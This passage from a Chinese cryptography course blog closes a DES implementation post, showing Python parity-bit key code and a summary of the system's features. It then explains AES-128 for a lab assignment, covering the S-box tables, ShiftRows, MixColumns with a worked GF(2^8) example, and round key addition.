<span class="number">122</span>)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tmplist:</span><br><span class="line">        strr += i</span><br><span class="line">    keylist = encode(strr)</span><br><span class="line">    <span class="comment"># 补充奇偶校验位</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(keylist)):</span><br><span class="line">        keylist[i] = ParityCheck(keylist[i])</span><br><span class="line">    key_bin = <span class="string">''</span>.join(keylist)</span><br><span class="line">    print(<span class="string">"Your Key: "</span>, strr)</span><br><span class="line">    print(<span class="string">"Your Binary Key: "</span>, key_bin)</span><br><span class="line">    print(<span class="string">"Your Hex Key: "</span>, hex(int(key_bin, base=<span class="number">2</span>)).upper())</span><br><span class="line">    <span class="keyword">return</span> key_bin</span><br></pre></td></tr></table></figure></li></ul></li><li><p>校验位的生成和补位操作</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ParityCheck</span><span class="params">(s)</span>:</span><span class="comment">#偶校验</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">'1'</span>:</span><br><span class="line">            num = num +<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> num%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        s += <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s += <span class="string">'1'</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"> <span class="comment"># 补充奇偶校验位</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(keylist)):</span><br><span class="line">            keylist[i] = ParityCheck(keylist[i])</span><br><span class="line">        key_bin = <span class="string">''</span>.join(keylist)</span><br><span class="line">        print(<span class="string">"Your Key: "</span>, strr)</span><br><span class="line">        print(<span class="string">"Your Binary Key: "</span>, key_bin)</span><br><span class="line">        print(<span class="string">"Your Hex Key: "</span>, hex(int(key_bin, base=<span class="number">2</span>)).upper())</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h3><p>实现文本加密</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94DES/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(21).png" alt></p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94DES/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(22).png" alt></p><p>实现十六进制输入加密</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94DES/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(23).png" alt></p><p>实现二进制输入解密</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94DES/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(24).png" alt></p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94DES/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(25).png" alt></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="系统亮点"><a href="#系统亮点" class="headerlink" title="系统亮点"></a>系统亮点</h4><ul><li>实现了完成的Feistel密码结构的分层</li><li>实现了Key轮加密密钥的类抽象</li><li>实现了随机密钥的生成方法</li><li>提供了包括二进制、十六进制、字符串、文本文件在内的多种输入方式</li><li>提供了自定义轮函数的接口</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>AES-ECB</title>
      <link href="/2019/10/12/AES-ECB/"/>
      <url>/2019/10/12/AES-ECB/</url>
      
        <content type="html"><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><ul><li><p>实现GF(28)加法与乘法运算并验算正确性</p><ul><li>算法运算采用多项式表示法</li><li>加法运算实际上就是按位异或</li><li>乘法运算实现要利用XTime运算来设计算法，取模11B</li><li>要用课本的例子验算是否正确实现</li></ul></li><li><p>实现系数在GF(28)上的多项式的乘法</p><ul><li>运算是4字节向量乘4字节向量（向量的分量表示多项式的系数）</li><li>输出是4字节向量</li><li>运算过程，字节对字节的加法就是异或，乘法需调用第1步实现的乘法</li></ul></li><li><p>AES算法实现</p><ul><li><p>输入：Nb, Nk, 明文分组，种子密钥，</p><p>输出：密文分组 </p><p>明文分组以字符串形式输入，密文分组以16进制形式输出，密钥的输入形式自行设计</p></li><li><p>实现字节代换ByteSub及逆代换InvByteSub</p></li><li><p>实现行移位ShiftRow及逆行移位InvShiftRow</p></li><li><p>实现列混淆MixColum及逆列混淆InvMixcColumn，注意，（逆）列混淆实现需要调用第2步实现的多项式乘法</p></li><li><p>用密钥编排算法获取轮密钥</p></li><li><p>实现AES加密与解密，注意加密密钥与解密密钥次序与差别</p></li></ul></li><li><p>附加内容</p><ul><li>用代码自动生成字节替换所用的S盒与逆S盒</li></ul></li></ul><h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>高级加密标准(AES,Advanced Encryption Standard)为最常见的对称加密算法(微信小程序加密传输就是用这个加密算法的)。对称加密算法也就是加密和解密用相同的密钥，具体的加密流程如下图：<br><img src="https://img-blog.csdn.net/20170219082909688?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="加密流程图"><br> 下面简单介绍下各个部分的作用与意义：</p><ul><li><p>明文P</p><blockquote><p>没有经过加密的数据。</p></blockquote></li><li><p>密钥K</p><blockquote><p>用来加密明文的密码，在对称加密算法中，加密与解密的密钥是相同的。密钥为接收方与发送方协商产生，但不可以直接在网络上传输，否则会导致密钥泄漏，通常是通过非对称加密算法加密密钥，然后再通过网络传输给对方，或者直接面对面商量密钥。密钥是绝对不可以泄漏的，否则会被攻击者还原密文，窃取机密数据。</p></blockquote></li><li><p>AES加密函数</p><blockquote><p>设AES加密函数为E，则 C = E(K, P),其中P为明文，K为密钥，C为密文。也就是说，把明文P和密钥K作为加密函数的参数输入，则加密函数E会输出密文C。</p></blockquote></li><li><p>密文C</p><blockquote><p>经加密函数处理后的数据</p></blockquote></li><li><p>AES解密函数</p><blockquote><p>设AES解密函数为D，则 P = D(K, C),其中C为密文，K为密钥，P为明文。也就是说，把密文C和密钥K作为解密函数的参数输入，则解密函数会输出明文P。</p></blockquote></li></ul><p>在这里简单介绍下对称加密算法与非对称加密算法的区别。</p><ul><li><p>对称加密算法</p><blockquote><p>加密和解密用到的密钥是相同的，这种加密方式加密速度非常快，适合经常发送数据的场合。缺点是密钥的传输比较麻烦。</p></blockquote></li><li><p>非对称加密算法</p><blockquote><p>加密和解密用的密钥是不同的，这种加密方式是用数学上的难解问题构造的，通常加密解密的速度比较慢，适合偶尔发送数据的场合。优点是密钥传输方便。常见的非对称加密算法为RSA、ECC和EIGamal。</p></blockquote></li></ul><p>实际中，一般是通过RSA加密AES的密钥，传输到接收方，接收方解密得到AES密钥，然后发送方和接收方用AES密钥来通信。</p><p>本文下面AES原理的介绍参考自《现代密码学教程》，AES的实现在介绍完原理后开始。</p><h3 id="AES的基本结构"><a href="#AES的基本结构" class="headerlink" title="AES的基本结构"></a>AES的基本结构</h3><p>AES为分组密码，分组密码也就是把明文分成一组一组的，每组长度相等，每次加密一组数据，直到加密完整个明文。在AES标准规范中，分组长度只能是128位，也就是说，每个分组为16个字节（每个字节8位）。密钥的长度可以使用128位、192位或256位。密钥的长度不同，推荐加密轮数也不同，如下表所示：</p><table><thead><tr><th>AES</th><th>密钥长度（32位比特字)</th><th>分组长度(32位比特字)</th><th>加密轮数</th></tr></thead><tbody><tr><td>AES-128</td><td>4</td><td>4</td><td>10</td></tr><tr><td>AES-192</td><td>6</td><td>4</td><td>12</td></tr><tr><td>AES-256</td><td>8</td><td>4</td><td>14</td></tr></tbody></table><p>轮数在下面介绍，这里实现的是AES-128，也就是密钥的长度为128位，加密轮数为10轮。<br> 上面说到，AES的加密公式为C = E(K,P)，在加密函数E中，会执行一个轮函数，并且执行10次这个轮函数，这个轮函数的前9次执行的操作是一样的，只有第10次有所不同。也就是说，一个明文分组会被加密10轮。AES的核心就是实现一轮中的所有操作。</p><p>AES的处理单位是字节，128位的输入明文分组P和输入密钥K都被分成16个字节，分别记为P = P0 P1 … P15 和 K = K0  K1 … K15。如，明文分组为P =  abcdefghijklmnop,其中的字符a对应P0，p对应P15。一般地，明文分组用字节为单位的正方形矩阵描述，称为状态矩阵。在算法的每一轮中，状态矩阵的内容不断发生变化，最后的结果作为密文输出。该矩阵中字节的排列顺序为从上到下、从左至右依次排列，如下图所示：<br><img src="https://img-blog.csdn.net/20170219132548906?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="state"></p><p>现在假设明文分组P为”abcdefghijklmnop”，则对应上面生成的状态矩阵图如下：<br><img src="https://img-blog.csdn.net/20170219134722812?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="state2"><br> 上图中，0x61为字符a的十六进制表示。可以看到，明文经过AES加密后，已经面目全非。</p><p>类似地，128位密钥也是用字节为单位的矩阵表示，矩阵的每一列被称为1个32位比特字。通过密钥编排函数该密钥矩阵被扩展成一个44个字组成的序列W[0],W[1],  …  ,W[43],该序列的前4个元素W[0],W[1],W[2],W[3]是原始密钥，用于加密运算中的初始密钥加（下面介绍）;后面40个字分为10组，每组4个字（128比特）分别用于10轮加密运算中的轮密钥加，如下图所示：<br><img src="https://img-blog.csdn.net/20170219152638324?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="keystate"><br> 上图中，设K = “abcdefghijklmnop”，则K0 = a, K15 = p, W[0] = K0 K1 K2 K3 = “abcd”。</p><p>AES的整体结构如下图所示，其中的W[0,3]是指W[0]、W[1]、W[2]和W[3]串联组成的128位密钥。加密的第1轮到第9轮的轮函数一样，包括4个操作：字节代换、行位移、列混合和轮密钥加。最后一轮迭代不执行列混合。另外，在第一轮迭代之前，先将明文和原始密钥进行一次异或加密操作。<br><img src="https://img-blog.csdn.net/20170219161202485?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="aes_struct"><br> 上图也展示了AES解密过程，解密过程仍为10轮，每一轮的操作是加密操作的逆操作。由于AES的4个轮操作都是可逆的，因此，解密操作的一轮就是顺序执行逆行移位、逆字节代换、轮密钥加和逆列混合。同加密操作类似，最后一轮不执行逆列混合，在第1轮解密之前，要执行1次密钥加操作。</p><p>下面分别介绍AES中一轮的4个操作阶段，这4分操作阶段使输入位得到充分的混淆。</p><h3 id="一、字节代换"><a href="#一、字节代换" class="headerlink" title="一、字节代换"></a>一、字节代换</h3><h4 id="1-字节代换操作"><a href="#1-字节代换操作" class="headerlink" title="1.字节代换操作"></a>1.字节代换操作</h4><p>AES的字节代换其实就是一个简单的查表操作。AES定义了一个S盒和一个逆S盒。<br> AES的S盒：</p><table><thead><tr><th>行/列</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0</td><td>0x63</td><td>0x7c</td><td>0x77</td><td>0x7b</td><td>0xf2</td><td>0x6b</td><td>0x6f</td><td>0xc5</td><td>0x30</td><td>0x01</td><td>0x67</td><td>0x2b</td><td>0xfe</td><td>0xd7</td><td>0xab</td><td>0x76</td></tr><tr><td>1</td><td>0xca</td><td>0x82</td><td>0xc9</td><td>0x7d</td><td>0xfa</td><td>0x59</td><td>0x47</td><td>0xf0</td><td>0xad</td><td>0xd4</td><td>0xa2</td><td>0xaf</td><td>0x9c</td><td>0xa4</td><td>0x72</td><td>0xc0</td></tr><tr><td>2</td><td>0xb7</td><td>0xfd</td><td>0x93</td><td>0x26</td><td>0x36</td><td>0x3f</td><td>0xf7</td><td>0xcc</td><td>0x34</td><td>0xa5</td><td>0xe5</td><td>0xf1</td><td>0x71</td><td>0xd8</td><td>0x31</td><td>0x15</td></tr><tr><td>3</td><td>0x04</td><td>0xc7</td><td>0x23</td><td>0xc3</td><td>0x18</td><td>0x96</td><td>0x05</td><td>0x9a</td><td>0x07</td><td>0x12</td><td>0x80</td><td>0xe2</td><td>0xeb</td><td>0x27</td><td>0xb2</td><td>0x75</td></tr><tr><td>4</td><td>0x09</td><td>0x83</td><td>0x2c</td><td>0x1a</td><td>0x1b</td><td>0x6e</td><td>0x5a</td><td>0xa0</td><td>0x52</td><td>0x3b</td><td>0xd6</td><td>0xb3</td><td>0x29</td><td>0xe3</td><td>0x2f</td><td>0x84</td></tr><tr><td>5</td><td>0x53</td><td>0xd1</td><td>0x00</td><td>0xed</td><td>0x20</td><td>0xfc</td><td>0xb1</td><td>0x5b</td><td>0x6a</td><td>0xcb</td><td>0xbe</td><td>0x39</td><td>0x4a</td><td>0x4c</td><td>0x58</td><td>0xcf</td></tr><tr><td>6</td><td>0xd0</td><td>0xef</td><td>0xaa</td><td>0xfb</td><td>0x43</td><td>0x4d</td><td>0x33</td><td>0x85</td><td>0x45</td><td>0xf9</td><td>0x02</td><td>0x7f</td><td>0x50</td><td>0x3c</td><td>0x9f</td><td>0xa8</td></tr><tr><td>7</td><td>0x51</td><td>0xa3</td><td>0x40</td><td>0x8f</td><td>0x92</td><td>0x9d</td><td>0x38</td><td>0xf5</td><td>0xbc</td><td>0xb6</td><td>0xda</td><td>0x21</td><td>0x10</td><td>0xff</td><td>0xf3</td><td>0xd2</td></tr><tr><td>8</td><td>0xcd</td><td>0x0c</td><td>0x13</td><td>0xec</td><td>0x5f</td><td>0x97</td><td>0x44</td><td>0x17</td><td>0xc4</td><td>0xa7</td><td>0x7e</td><td>0x3d</td><td>0x64</td><td>0x5d</td><td>0x19</td><td>0x73</td></tr><tr><td>9</td><td>0x60</td><td>0x81</td><td>0x4f</td><td>0xdc</td><td>0x22</td><td>0x2a</td><td>0x90</td><td>0x88</td><td>0x46</td><td>0xee</td><td>0xb8</td><td>0x14</td><td>0xde</td><td>0x5e</td><td>0x0b</td><td>0xdb</td></tr><tr><td>A</td><td>0xe0</td><td>0x32</td><td>0x3a</td><td>0x0a</td><td>0x49</td><td>0x06</td><td>0x24</td><td>0x5c</td><td>0xc2</td><td>0xd3</td><td>0xac</td><td>0x62</td><td>0x91</td><td>0x95</td><td>0xe4</td><td>0x79</td></tr><tr><td>B</td><td>0xe7</td><td>0xc8</td><td>0x37</td><td>0x6d</td><td>0x8d</td><td>0xd5</td><td>0x4e</td><td>0xa9</td><td>0x6c</td><td>0x56</td><td>0xf4</td><td>0xea</td><td>0x65</td><td>0x7a</td><td>0xae</td><td>0x08</td></tr><tr><td>C</td><td>0xba</td><td>0x78</td><td>0x25</td><td>0x2e</td><td>0x1c</td><td>0xa6</td><td>0xb4</td><td>0xc6</td><td>0xe8</td><td>0xdd</td><td>0x74</td><td>0x1f</td><td>0x4b</td><td>0xbd</td><td>0x8b</td><td>0x8a</td></tr><tr><td>D</td><td>0x70</td><td>0x3e</td><td>0xb5</td><td>0x66</td><td>0x48</td><td>0x03</td><td>0xf6</td><td>0x0e</td><td>0x61</td><td>0x35</td><td>0x57</td><td>0xb9</td><td>0x86</td><td>0xc1</td><td>0x1d</td><td>0x9e</td></tr><tr><td>E</td><td>0xe1</td><td>0xf8</td><td>0x98</td><td>0x11</td><td>0x69</td><td>0xd9</td><td>0x8e</td><td>0x94</td><td>0x9b</td><td>0x1e</td><td>0x87</td><td>0xe9</td><td>0xce</td><td>0x55</td><td>0x28</td><td>0xdf</td></tr><tr><td>F</td><td>0x8c</td><td>0xa1</td><td>0x89</td><td>0x0d</td><td>0xbf</td><td>0xe6</td><td>0x42</td><td>0x68</td><td>0x41</td><td>0x99</td><td>0x2d</td><td>0x0f</td><td>0xb0</td><td>0x54</td><td>0xbb</td><td>0x16</td></tr></tbody></table><p>状态矩阵中的元素按照下面的方式映射为一个新的字节：把该字节的高4位作为行值，低4位作为列值，取出S盒或者逆S盒中对应的行的元素作为输出。例如，加密时，输出的字节S1为0x12,则查S盒的第0x01行和0x02列，得到值0xc9,然后替换S1原有的0x12为0xc9。状态矩阵经字节代换后的图如下：<br><img src="https://img-blog.csdn.net/20170219171003857?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="byte"></p><h4 id="2-字节代换逆操作"><a href="#2-字节代换逆操作" class="headerlink" title="2.字节代换逆操作"></a>2.字节代换逆操作</h4><p>逆字节代换也就是查逆S盒来变换，逆S盒如下：</p><table><thead><tr><th>行/列</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0</td><td>0x52</td><td>0x09</td><td>0x6a</td><td>0xd5</td><td>0x30</td><td>0x36</td><td>0xa5</td><td>0x38</td><td>0xbf</td><td>0x40</td><td>0xa3</td><td>0x9e</td><td>0x81</td><td>0xf3</td><td>0xd7</td><td>0xfb</td></tr><tr><td>1</td><td>0x7c</td><td>0xe3</td><td>0x39</td><td>0x82</td><td>0x9b</td><td>0x2f</td><td>0xff</td><td>0x87</td><td>0x34</td><td>0x8e</td><td>0x43</td><td>0x44</td><td>0xc4</td><td>0xde</td><td>0xe9</td><td>0xcb</td></tr><tr><td>2</td><td>0x54</td><td>0x7b</td><td>0x94</td><td>0x32</td><td>0xa6</td><td>0xc2</td><td>0x23</td><td>0x3d</td><td>0xee</td><td>0x4c</td><td>0x95</td><td>0x0b</td><td>0x42</td><td>0xfa</td><td>0xc3</td><td>0x4e</td></tr><tr><td>3</td><td>0x08</td><td>0x2e</td><td>0xa1</td><td>0x66</td><td>0x28</td><td>0xd9</td><td>0x24</td><td>0xb2</td><td>0x76</td><td>0x5b</td><td>0xa2</td><td>0x49</td><td>0x6d</td><td>0x8b</td><td>0xd1</td><td>0x25</td></tr><tr><td>4</td><td>0x72</td><td>0xf8</td><td>0xf6</td><td>0x64</td><td>0x86</td><td>0x68</td><td>0x98</td><td>0x16</td><td>0xd4</td><td>0xa4</td><td>0x5c</td><td>0xcc</td><td>0x5d</td><td>0x65</td><td>0xb6</td><td>0x92</td></tr><tr><td>5</td><td>0x6c</td><td>0x70</td><td>0x48</td><td>0x50</td><td>0xfd</td><td>0xed</td><td>0xb9</td><td>0xda</td><td>0x5e</td><td>0x15</td><td>0x46</td><td>0x57</td><td>0xa7</td><td>0x8d</td><td>0x9d</td><td>0x84</td></tr><tr><td>6</td><td>0x90</td><td>0xd8</td><td>0xab</td><td>0x00</td><td>0x8c</td><td>0xbc</td><td>0xd3</td><td>0x0a</td><td>0xf7</td><td>0xe4</td><td>0x58</td><td>0x05</td><td>0xb8</td><td>0xb3</td><td>0x45</td><td>0x06</td></tr><tr><td>7</td><td>0xd0</td><td>0x2c</td><td>0x1e</td><td>0x8f</td><td>0xca</td><td>0x3f</td><td>0x0f</td><td>0x02</td><td>0xc1</td><td>0xaf</td><td>0xbd</td><td>0x03</td><td>0x01</td><td>0x13</td><td>0x8a</td><td>0x6b</td></tr><tr><td>8</td><td>0x3a</td><td>0x91</td><td>0x11</td><td>0x41</td><td>0x4f</td><td>0x67</td><td>0xdc</td><td>0xea</td><td>0x97</td><td>0xf2</td><td>0xcf</td><td>0xce</td><td>0xf0</td><td>0xb4</td><td>0xe6</td><td>0x73</td></tr><tr><td>9</td><td>0x96</td><td>0xac</td><td>0x74</td><td>0x22</td><td>0xe7</td><td>0xad</td><td>0x35</td><td>0x85</td><td>0xe2</td><td>0xf9</td><td>0x37</td><td>0xe8</td><td>0x1c</td><td>0x75</td><td>0xdf</td><td>0x6e</td></tr><tr><td>A</td><td>0x47</td><td>0xf1</td><td>0x1a</td><td>0x71</td><td>0x1d</td><td>0x29</td><td>0xc5</td><td>0x89</td><td>0x6f</td><td>0xb7</td><td>0x62</td><td>0x0e</td><td>0xaa</td><td>0x18</td><td>0xbe</td><td>0x1b</td></tr><tr><td>B</td><td>0xfc</td><td>0x56</td><td>0x3e</td><td>0x4b</td><td>0xc6</td><td>0xd2</td><td>0x79</td><td>0x20</td><td>0x9a</td><td>0xdb</td><td>0xc0</td><td>0xfe</td><td>0x78</td><td>0xcd</td><td>0x5a</td><td>0xf4</td></tr><tr><td>C</td><td>0x1f</td><td>0xdd</td><td>0xa8</td><td>0x33</td><td>0x88</td><td>0x07</td><td>0xc7</td><td>0x31</td><td>0xb1</td><td>0x12</td><td>0x10</td><td>0x59</td><td>0x27</td><td>0x80</td><td>0xec</td><td>0x5f</td></tr><tr><td>D</td><td>0x60</td><td>0x51</td><td>0x7f</td><td>0xa9</td><td>0x19</td><td>0xb5</td><td>0x4a</td><td>0x0d</td><td>0x2d</td><td>0xe5</td><td>0x7a</td><td>0x9f</td><td>0x93</td><td>0xc9</td><td>0x9c</td><td>0xef</td></tr><tr><td>E</td><td>0xa0</td><td>0xe0</td><td>0x3b</td><td>0x4d</td><td>0xae</td><td>0x2a</td><td>0xf5</td><td>0xb0</td><td>0xc8</td><td>0xeb</td><td>0xbb</td><td>0x3c</td><td>0x83</td><td>0x53</td><td>0x99</td><td>0x61</td></tr><tr><td>F</td><td>0x17</td><td>0x2b</td><td>0x04</td><td>0x7e</td><td>0xba</td><td>0x77</td><td>0xd6</td><td>0x26</td><td>0xe1</td><td>0x69</td><td>0x14</td><td>0x63</td><td>0x55</td><td>0x21</td><td>0x0c</td><td>0x7d</td></tr></tbody></table><h3 id="二、行移位"><a href="#二、行移位" class="headerlink" title="二、行移位"></a>二、行移位</h3><h4 id="1-行移位操作"><a href="#1-行移位操作" class="headerlink" title="1.行移位操作"></a>1.行移位操作</h4><p>行移位是一个简单的左循环移位操作。当密钥长度为128比特时，状态矩阵的第0行左移0字节，第1行左移1字节，第2行左移2字节，第3行左移3字节，如下图所示：<br><img src="https://img-blog.csdn.net/20170219174015167?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="shiftRows"></p><h4 id="2-行移位的逆变换"><a href="#2-行移位的逆变换" class="headerlink" title="2.行移位的逆变换"></a>2.行移位的逆变换</h4><p>行移位的逆变换是将状态矩阵中的每一行执行相反的移位操作，例如AES-128中，状态矩阵的第0行右移0字节，第1行右移1字节，第2行右移2字节，第3行右移3字节。</p><h3 id="三、列混合"><a href="#三、列混合" class="headerlink" title="三、列混合"></a>三、列混合</h3><h4 id="1-列混合操作"><a href="#1-列混合操作" class="headerlink" title="1.列混合操作"></a>1.列混合操作</h4><p>列混合变换是通过矩阵相乘来实现的，经行移位后的状态矩阵与固定的矩阵相乘，得到混淆后的状态矩阵，如下图的公式所示：<br><img src="https://img-blog.csdn.net/20170219203346436?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="col"></p><p>状态矩阵中的第j列(0 ≤j≤3)的列混合可以表示为下图所示：<br><img src="https://img-blog.csdn.net/20170219203742516?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="col2"></p><p>其中，矩阵元素的乘法和加法都是定义在基于GF(2^8)上的二元运算,并不是通常意义上的乘法和加法。这里涉及到一些信息安全上的数学知识，不过不懂这些知识也行。其实这种二元运算的加法等价于两个字节的异或，乘法则复杂一点。对于一个8位的二进制数来说，使用域上的乘法乘以(00000010)等价于左移1位(低位补0)后，再根据情况同(00011011)进行异或运算，设S1  = (a7 a6 a5 a4 a3 a2 a1 a0)，刚0x02 * S1如下图所示：<br><img src="https://img-blog.csdn.net/20170219204822517?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="col3"><br> 也就是说，如果a7为1，则进行异或运算，否则不进行。<br> 类似地，乘以(00000100)可以拆分成两次乘以(00000010)的运算：<br><img src="https://img-blog.csdn.net/20170219205601683?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="col4"><br> 乘以(0000 0011)可以拆分成先分别乘以(0000 0001)和(0000 0010)，再将两个乘积异或：<br><img src="https://img-blog.csdn.net/20170219210554133?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="col5"><br> 因此，我们只需要实现乘以2的函数，其他数值的乘法都可以通过组合来实现。<br> 下面举个具体的例子,输入的状态矩阵如下：</p><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>C9</td><td>E5</td><td>FD</td><td>2B</td></tr><tr><td>7A</td><td>F2</td><td>78</td><td>6E</td></tr><tr><td>63</td><td>9C</td><td>26</td><td>67</td></tr><tr><td>B0</td><td>A7</td><td>82</td><td>E5</td></tr></tbody></table><p>下面，进行列混合运算：<br> 以第一列的运算为例：<br><img src="https://img-blog.csdn.net/20170219213747965?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="col7"><br> 其它列的计算就不列举了，列混合后生成的新状态矩阵如下：</p><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>D4</td><td>E7</td><td>CD</td><td>66</td></tr><tr><td>28</td><td>02</td><td>E5</td><td>BB</td></tr><tr><td>BE</td><td>C6</td><td>D6</td><td>BF</td></tr><tr><td>22</td><td>0F</td><td>DF</td><td>A5</td></tr></tbody></table><h4 id="2-列混合逆运算"><a href="#2-列混合逆运算" class="headerlink" title="2.列混合逆运算"></a>2.列混合逆运算</h4><p>逆向列混合变换可由下图的矩阵乘法定义：<br><img src="https://img-blog.csdn.net/20170219211139752?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="col6"><br> 可以验证，逆变换矩阵同正变换矩阵的乘积恰好为单位矩阵。</p><h3 id="四、轮密钥加"><a href="#四、轮密钥加" class="headerlink" title="四、轮密钥加"></a>四、轮密钥加</h3><p>轮密钥加是将128位轮密钥Ki同状态矩阵中的数据进行逐位异或操作，如下图所示。其中，密钥Ki中每个字W[4i],W[4i+1],W[4i+2],W[4i+3]为32位比特字，包含4个字节，他们的生成算法下面在下面介绍。轮密钥加过程可以看成是字逐位异或的结果，也可以看成字节级别或者位级别的操作。也就是说，可以看成S0  S1 S2 S3 组成的32位字与W[4i]的异或运算。<br><img src="https://img-blog.csdn.net/20170220080512086?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="roundadd"><br> 轮密钥加的逆运算同正向的轮密钥加运算完全一致，这是因为异或的逆操作是其自身。轮密钥加非常简单，但却能够影响S数组中的每一位。</p><h3 id="五、密钥扩展"><a href="#五、密钥扩展" class="headerlink" title="五、密钥扩展"></a>五、密钥扩展</h3><p>AES首先将初始密钥输入到一个4<em>4的状态矩阵中，如下图所示。<br><img 